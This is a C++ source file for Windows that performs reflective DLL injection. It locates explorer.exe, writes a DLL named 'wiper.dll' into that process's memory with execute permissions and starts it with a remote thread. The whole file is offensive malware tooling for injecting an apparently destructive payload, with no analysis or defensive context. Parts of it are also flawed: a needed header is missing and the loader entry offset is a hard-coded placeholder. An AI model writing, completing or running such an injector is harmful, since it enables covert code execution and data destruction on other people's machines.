#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <fstream>

// Reads the entire DLL into memory
std::vector<BYTE> LoadDllToMemory(const std::string& path) {
    std::ifstream file(path, std::ios::binary);
    return { std::istreambuf_iterator<char>(file), std::istreambuf_iterator<char>() };
}

// Gets process ID by name
DWORD GetProcessIdByName(const std::wstring& procName) {
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(hSnap, &pe)) {
            do {
                if (!_wcsicmp(pe.szExeFile, procName.c_str())) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
    return pid;
}

bool InjectReflectiveDll(const std::vector<BYTE>& dllBuffer, DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;

    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, dllBuffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        CloseHandle(hProcess);
        return false;
    }

    if (!WriteProcessMemory(hProcess, remoteMem, dllBuffer.data(), dllBuffer.size(), NULL)) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Assume the DLL is prepared with ReflectiveLoader exported function at offset (e.g., parsed by PE loader)
    DWORD_PTR loadOffset = reinterpret_cast<DWORD_PTR>(remoteMem) + 0x1000; // adjust based on actual entry RVA
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadOffset, remoteMem, 0, NULL);

    if (!hThread) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}

int main() {
    std::wstring targetProcess = L"explorer.exe";  // Inject into explorer.exe or any target
    DWORD pid = GetProcessIdByName(targetProcess);
    if (pid == 0) {
        std::wcerr << L"[-] Target process not found\n";
        return -1;
    }

    std::vector<BYTE> dllBuffer = LoadDllToMemory("wiper.dll");
    if (dllBuffer.empty()) {
        std::cerr << "[-] Failed to read DLL\n";
        return -1;
    }

    if (InjectReflectiveDll(dllBuffer, pid)) {
        std::cout << "[+] DLL successfully injected into PID: " << pid << "\n";
    } else {
        std::cerr << "[-] Injection failed\n";
    }

    return 0;
}
